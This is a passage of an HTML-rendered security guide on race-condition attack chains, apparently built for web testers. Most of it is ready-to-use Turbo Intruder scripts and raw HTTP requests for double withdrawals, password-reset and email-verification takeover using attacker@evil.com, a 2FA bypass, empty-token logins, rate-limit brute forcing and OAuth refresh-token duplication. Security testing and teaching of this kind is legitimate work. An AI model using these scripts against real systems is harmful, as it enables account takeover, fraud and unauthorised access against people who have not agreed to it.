+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>    <span class="n">withdrawReq</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;POST /api/withdraw HTTP/2</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="s1">Host: bank.example.com</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="s1">Authorization: Bearer xxx</span>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="s1">Content-Type: application/json</span>
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="s1">{&quot;amount&quot;: 100, &quot;destination&quot;: &quot;attacker_account&quot;}&#39;&#39;&#39;</span>
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>        <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">withdrawReq</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>
+</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>    <span class="n">engine</span><span class="o">.</span><span class="n">openGate</span><span class="p">(</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span></code></pre></div>
+<h3 id="financial-platform-variations">Financial Platform Variations<a class="headerlink" href="#financial-platform-variations" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Crypto exchanges</strong>: Withdraw more tokens than balance</li>
+<li><strong>Gaming platforms</strong>: Bet more credits than available</li>
+<li><strong>Gift card sites</strong>: Transfer full balance multiple times</li>
+<li><strong>Reward programs</strong>: Redeem points multiple times</li>
+</ul>
+<hr />
+<h2 id="chain-3-state-confusion-password-reset-takeover">Chain 3: State Confusion — Password Reset Takeover<a class="headerlink" href="#chain-3-state-confusion-password-reset-takeover" title="Permanent link">&para;</a></h2>
+<p><strong>From James Kettle's research: Session-based race condition in password reset</strong></p>
+<h3 id="vulnerable-pattern-deviserails-common-issue">Vulnerable Pattern (Devise/Rails common issue)<a class="headerlink" href="#vulnerable-pattern-deviserails-common-issue" title="Permanent link">&para;</a></h3>
+<div class="language-ruby highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># Password reset flow stores in session</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="n">session</span><span class="o">[</span><span class="ss">:reset_user_id</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">params</span><span class="o">[</span><span class="ss">:email</span><span class="o">]</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">generate_token</span><span class="p">()</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="n">session</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">token</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="n">send_email</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:email</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">token</span><span class="p">)</span>
+</span></code></pre></div>
+<h3 id="attack_1">Attack<a class="headerlink" href="#attack_1" title="Permanent link">&para;</a></h3>
+<p>Two concurrent password reset requests from <strong>same session</strong>, different emails:
+1. Request A: <code>email=victim@target.com</code>
+2. Request B: <code>email=attacker@evil.com</code></p>
+<p><strong>Result</strong>: Session ends up with:
+- <code>reset_user_id = victim@target.com</code> (from request A)
+- <code>reset_token = [token sent to attacker@evil.com]</code> (from request B)</p>
+<p>Attacker receives token that resets victim's password!</p>
+<h3 id="exploitation-script">Exploitation Script<a class="headerlink" href="#exploitation-script" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>    <span class="n">engine</span> <span class="o">=</span> <span class="n">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="o">.</span><span class="n">endpoint</span><span class="p">,</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>                          <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>                          <span class="n">engine</span><span class="o">=</span><span class="n">Engine</span><span class="o">.</span><span class="n">BURP2</span><span class="p">)</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>    <span class="k">for</span> <span class="n">attempt</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>        <span class="c1"># Victim email</span>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>        <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;POST /password/reset HTTP/2</span>
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="s1">Host: target.com</span>
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="s1">Cookie: session=shared_session_id</span>
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="s1">email=victim@company.com&#39;&#39;&#39;</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">attempt</span><span class="p">))</span>
+</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>
+</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>        <span class="c1"># Attacker email</span>
+</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>        <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;POST /password/reset HTTP/2</span>
+</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a><span class="s1">Host: target.com</span>
+</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a><span class="s1">Cookie: session=shared_session_id</span>
+</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>
+</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a><span class="s1">email=attacker@evil.com&#39;&#39;&#39;</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">attempt</span><span class="p">))</span>
+</span><span id="__span-12-20"><a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a>
+</span><span id="__span-12-21"><a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a>        <span class="n">engine</span><span class="o">.</span><span class="n">openGate</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">attempt</span><span class="p">))</span>
+</span></code></pre></div>
+<hr />
+<h2 id="chain-4-2fa-bypass-via-race-window">Chain 4: 2FA Bypass via Race Window<a class="headerlink" href="#chain-4-2fa-bypass-via-race-window" title="Permanent link">&para;</a></h2>
+<p><strong>Exploit the sub-state between login and 2FA enforcement</strong></p>
+<h3 id="vulnerable-pattern_2">Vulnerable Pattern<a class="headerlink" href="#vulnerable-pattern_2" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>    <span class="n">user</span> <span class="o">=</span> <span class="n">authenticate</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span><span class="o">.</span><span class="n">id</span>          <span class="c1"># Logged in!</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>    <span class="k">if</span> <span class="n">user</span><span class="o">.</span><span class="n">mfa_enabled</span><span class="p">:</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;enforce_mfa&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span>      <span class="c1"># MFA flag set AFTER login</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>        <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;/mfa-verify&#39;</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong>Race window</strong>: User is "logged in" before <code>enforce_mfa</code> is set.</p>
+<h3 id="attack_2">Attack<a class="headerlink" href="#attack_2" title="Permanent link">&para;</a></h3>
+<p>Simultaneously:
+1. Send login request
+2. Send request to sensitive authenticated endpoint</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>    <span class="n">engine</span> <span class="o">=</span> <span class="n">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="o">.</span><span class="n">endpoint</span><span class="p">,</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>                          <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>                          <span class="n">engine</span><span class="o">=</span><span class="n">Engine</span><span class="o">.</span><span class="n">BURP2</span><span class="p">)</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>    <span class="n">loginReq</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;POST /login HTTP/2</span>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="s1">Host: target.com</span>
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="s1">Content-Type: application/x-www-form-urlencoded</span>
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>
+</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="s1">username=victim&amp;password=known_password&#39;&#39;&#39;</span>
+</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>
+</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>    <span class="n">adminReq</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;GET /admin/dashboard HTTP/2</span>
+</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="s1">Host: target.com</span>
+</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="s1">Cookie: session=new_session_token&#39;&#39;&#39;</span>
+</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>
+</span><span id="__span-14-16"><a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a>    <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">loginReq</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span><span id="__span-14-17"><a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+</span><span id="__span-14-18"><a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a>        <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">adminReq</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span><span id="__span-14-19"><a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a>
+</span><span id="__span-14-20"><a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a>    <span class="n">engine</span><span class="o">.</span><span class="n">openGate</span><span class="p">(</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span></code></pre></div>
+<h3 id="reported-bounties">Reported Bounties<a class="headerlink" href="#reported-bounties" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>HackerOne</strong>: 2FA bypass via race condition — $2,500</li>
+<li><strong>GitLab</strong>: Email verification race — Critical severity</li>
+</ul>
+<hr />
+<h2 id="chain-5-email-verification-swap-gitlab-vulnerability">Chain 5: Email Verification Swap (GitLab Vulnerability)<a class="headerlink" href="#chain-5-email-verification-swap-gitlab-vulnerability" title="Permanent link">&para;</a></h2>
+<p><strong>Confirms wrong email address via race</strong></p>
+<h3 id="attack-flow">Attack Flow<a class="headerlink" href="#attack-flow" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>1. Request email change to attacker@evil.com
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>2. Simultaneously request change to victim@target.com
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>3. Server sends verification tokens in race
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>4. Email to attacker contains token for victim&#39;s address
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>5. Click link → victim email now controlled by attacker
+</span></code></pre></div>
+<h3 id="proof-of-concept">Proof of Concept<a class="headerlink" href="#proof-of-concept" title="Permanent link">&para;</a></h3>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="err"># Request 1 - Send 10 times</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="nf">POST</span> <span class="nn">/api/user/email</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="na">Host</span><span class="o">:</span> <span class="l">gitlab.example.com</span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="na">Cookie</span><span class="o">:</span> <span class="l">session=xxx</span>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>{&quot;email&quot;: &quot;attacker@evil.com&quot;}
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a># Request 2 - Send 10 times
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>POST /api/user/email HTTP/2
+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>Host: gitlab.example.com
+</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>Cookie: session=xxx
+</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>
+</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a>{&quot;email&quot;: &quot;victim@company.com&quot;}
+</span></code></pre></div>
+<p><strong>Monitor attacker inbox for verification link → may confirm victim's email</strong></p>
+<hr />
+<h2 id="chain-6-partial-construction-race">Chain 6: Partial Construction Race<a class="headerlink" href="#chain-6-partial-construction-race" title="Permanent link">&para;</a></h2>
+<p><strong>Exploit uninitialized database fields</strong></p>
+<h3 id="vulnerable-pattern_3">Vulnerable Pattern<a class="headerlink" href="#vulnerable-pattern_3" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># User creation in two steps</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="n">INSERT</span> <span class="n">INTO</span> <span class="n">users</span> <span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span> <span class="n">VALUES</span> <span class="p">(</span><span class="err">?</span><span class="p">,</span> <span class="err">?</span><span class="p">)</span>  <span class="c1"># Step 1</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="n">UPDATE</span> <span class="n">users</span> <span class="n">SET</span> <span class="n">api_key</span> <span class="o">=</span> <span class="err">?</span> <span class="n">WHERE</span> <span class="nb">id</span> <span class="o">=</span> <span class="err">?</span>          <span class="c1"># Step 2</span>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="c1"># Brief window where api_key is NULL/empty</span>
+</span></code></pre></div>
+<h3 id="attack_3">Attack<a class="headerlink" href="#attack_3" title="Permanent link">&para;</a></h3>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="err"># Registration request</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="nf">POST</span> <span class="nn">/register</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="na">Host</span><span class="o">:</span> <span class="l">target.com</span>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>email=test@test.com&amp;username=newuser
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a># Simultaneously try to login with empty token
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>POST /api/auth HTTP/2
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>Host: target.com
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>token=                     # Empty string
+</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a>token[]=                   # Empty array (PHP)
+</span></code></pre></div>
+<p><strong>PHP trick</strong>: <code>param[]=</code> results in empty array, which may match uninitialized field</p>
+<h3 id="ruby-on-rails-version">Ruby on Rails Version<a class="headerlink" href="#ruby-on-rails-version" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>POST /api/verify?token[key]=
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a># Results in: {&quot;token&quot; =&gt; {&quot;key&quot; =&gt; nil}}
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a># May match user with nil confirmation token
+</span></code></pre></div>
+<hr />
+<h2 id="chain-7-rate-limit-bypass">Chain 7: Rate Limit Bypass<a class="headerlink" href="#chain-7-rate-limit-bypass" title="Permanent link">&para;</a></h2>
+<p><strong>Exhaust brute-force protection with parallel requests</strong></p>
+<h3 id="attack_4">Attack<a class="headerlink" href="#attack_4" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>    <span class="n">engine</span> <span class="o">=</span> <span class="n">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="o">.</span><span class="n">endpoint</span><span class="p">,</span>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>                          <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>                          <span class="n">engine</span><span class="o">=</span><span class="n">Engine</span><span class="o">.</span><span class="n">BURP2</span><span class="p">)</span>
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>    <span class="c1"># Send 100 password guesses before rate limit kicks in</span>
+</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>    <span class="n">passwords</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;password1&#39;</span><span class="p">,</span> <span class="s1">&#39;password2&#39;</span><span class="p">,</span> <span class="o">...</span><span class="p">]</span> <span class="c1"># 100 passwords</span>
+</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>
+</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>    <span class="k">for</span> <span class="n">pwd</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">:</span>
+</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a>        <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">target</span><span class="o">.</span><span class="n">req</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">%s</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">pwd</span><span class="p">),</span> <span class="n">gate</span><span class="o">=</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a>
+</span><span id="__span-20-12"><a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a>    <span class="n">engine</span><span class="o">.</span><span class="n">openGate</span><span class="p">(</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong>Result</strong>: 100 attempts processed before counter increments → bypass 5-attempt limit</p>
+<hr />
+<h2 id="chain-8-oauth-refresh-token-race">Chain 8: OAuth Refresh Token Race<a class="headerlink" href="#chain-8-oauth-refresh-token-race" title="Permanent link">&para;</a></h2>
+<p><strong>Generate multiple valid refresh tokens</strong></p>
+<h3 id="attack-flow_1">Attack Flow<a class="headerlink" href="#attack-flow_1" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>1. Legitimate OAuth authorization grants code
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>2. Race multiple token exchange requests
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>3. Each request may generate separate refresh token
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>4. User revokes access → some tokens survive
+</span></code></pre></div>
+<h3 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c1"># Same authorization_code, multiple simultaneous exchanges</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>    <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;POST /oauth/token HTTP/2</span>
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="s1">Host: oauth.provider.com</span>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="s1">Content-Type: application/x-www-form-urlencoded</span>
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="s1">grant_type=authorization_code&amp;code=SAME_CODE&amp;redirect_uri=...&#39;&#39;&#39;</span><span class="p">,</span> 
+</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>    <span class="n">gate</span><span class="o">=</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>
